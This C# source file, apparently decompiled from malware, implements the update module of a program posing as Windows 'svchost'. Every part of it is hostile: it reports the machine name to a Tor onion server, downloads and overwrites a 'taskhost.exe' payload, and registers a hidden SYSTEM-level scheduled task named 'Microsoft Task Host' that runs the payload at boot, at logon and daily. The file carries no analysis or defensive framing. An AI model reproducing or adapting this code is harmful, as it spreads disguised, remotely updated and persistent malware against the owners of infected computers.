using Microsoft.Win32.TaskScheduler;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using TaskScheduler;

namespace svchost
{
	public class Updater
	{
		private int iHowManyHoursToWait = 24;

		private Timer tmrUpdate;

		public void Start()
		{
			this.tmrUpdate = new Timer(new TimerCallback(this.start), null, 10000, this.iHowManyHoursToWait * 60 * 60 * 1000);
		}

		private void start(object obj)
		{
			try
			{
				Regex regex = new Regex("[^a-zA-Z0-9]");
				string text = regex.Replace(Environment.MachineName, "");
				string text2 = string.Concat(new object[]
				{
					Globals.sOnion,
					"/updates/info?id=",
					text,
					"&v=1.",
					Globals.myVersion
				});
				string address = Globals.sOnion + "/updates/download?id=" + text;
				if (Globals.dVersion == 1.0)
				{
					text2 += "&download=next";
				}
				SocksWebClient webClient = WebclientFactory.getWebClient();
				string text3 = webClient.DownloadString(text2);
				string s = text3.Split(new char[]
				{
					':'
				})[1];
				text3 = text3.Split(new char[]
				{
					':'
				})[0];
				try
				{
					this.iHowManyHoursToWait = int.Parse(s, CultureInfo.InvariantCulture);
				}
				catch
				{
				}
				this.tmrUpdate.Change(this.iHowManyHoursToWait * 60 * 60 * 1000, this.iHowManyHoursToWait * 60 * 60 * 1000);
				double num = 0.0;
				try
				{
					num = double.Parse(text3.Replace("v", "").Trim(), CultureInfo.InvariantCulture);
				}
				catch (Exception ex)
				{
					EventLog.WriteEntry("svchost.updater", string.Concat(new string[]
					{
						"Double: ",
						text3,
						" eol\r\n",
						ex.StackTrace.ToString(),
						"\r\n",
						ex.ToString()
					}));
					return;
				}
				if (num > Globals.dVersion)
				{
					try
					{
						Process[] processesByName = Process.GetProcessesByName("taskhost");
						if (processesByName.Length >= 1)
						{
							Process process = processesByName[0];
							string fileName = process.MainModule.FileName;
							if (fileName == Globals.sInstallDirectory + "\\taskhost.exe")
							{
								process.Kill();
								Thread.Sleep(15000);
							}
						}
					}
					catch (Exception ex2)
					{
						EventLog.WriteEntry("svchost.updater", ex2.StackTrace.ToString() + "\r\n" + ex2.ToString());
					}
					try
					{
						File.Delete(Globals.sInstallDirectory + "\\taskhost.exe");
						Thread.Sleep(15000);
					}
					catch
					{
					}
					webClient.DownloadFile(address, Globals.sInstallDirectory + "\\taskhost.exe");
					File.WriteAllText(Globals.sInstallDirectory + "\\installed.fgh", num.ToString().Replace("v", ""));
					Globals.dVersion = num;
					try
					{
						using (TaskService taskService = new TaskService())
						{
							TaskDefinition taskDefinition = taskService.NewTask();
							taskDefinition.get_Principal().set_RunLevel(1);
							taskDefinition.get_RegistrationInfo().set_Description("Executes the Microsoft Task Host");
							taskDefinition.get_RegistrationInfo().set_Description("Microsoft Task Host");
							taskDefinition.get_RegistrationInfo().set_Author("SYSTEM");
							taskDefinition.get_Principal().set_DisplayName("Task Host");
							BootTrigger bootTrigger = new BootTrigger();
							bootTrigger.set_Delay(TimeSpan.FromMinutes(5.0));
							LogonTrigger logonTrigger = new LogonTrigger();
							logonTrigger.set_Enabled(true);
							taskDefinition.get_Settings().set_ExecutionTimeLimit(TimeSpan.Zero);
							taskDefinition.get_Triggers().Add(bootTrigger);
							taskDefinition.get_Triggers().Add(logonTrigger);
							TriggerCollection arg_3F3_0 = taskDefinition.get_Triggers();
							DailyTrigger dailyTrigger = new DailyTrigger(1);
							dailyTrigger.set_DaysInterval(2);
							arg_3F3_0.Add(dailyTrigger);
							try
							{
								taskDefinition.get_Triggers().Add(new TimeTrigger(DateTime.Now.AddMinutes(5.0)));
							}
							catch
							{
							}
							taskDefinition.get_Actions().Add(new ExecAction(Globals.sInstallDirectory + "\\taskhost.exe", null, null));
							taskService.get_RootFolder().RegisterTaskDefinition("\\Microsoft\\Windows\\TaskHost", taskDefinition, 6, "SYSTEM", null, 5, null);
						}
					}
					catch (Exception var_23_496)
					{
						try
						{
							ScheduledTasks scheduledTasks = new ScheduledTasks();
							Task task = scheduledTasks.CreateTask("Microsoft Task Host");
							task.ApplicationName = Globals.sInstallDirectory + "\\taskhost.exe";
							task.Parameters = "";
							task.SetAccountInformation("", null);
							task.WorkingDirectory = Globals.sInstallDirectory;
							task.Flags = TaskFlags.SystemRequired;
							task.Hidden = true;
							task.IdleWaitDeadlineMinutes = 2;
							task.IdleWaitMinutes = 0;
							task.MaxRunTime = new TimeSpan(365, 0, 0, 0);
							task.Priority = ProcessPriorityClass.High;
							task.Triggers.Add(new RunOnceTrigger(DateTime.Now + TimeSpan.FromMinutes(5.0)));
							task.Triggers.Add(new DailyTrigger(8, 30, 1));
							task.Triggers.Add(new OnSystemStartTrigger());
							task.Save();
							task.Close();
						}
						catch (Exception ex3)
						{
						}
					}
				}
			}
			catch (Exception ex3)
			{
				EventLog.WriteEntry("svchost.updater", ex3.StackTrace.ToString() + "\r\n" + ex3.ToString());
			}
		}
	}
}
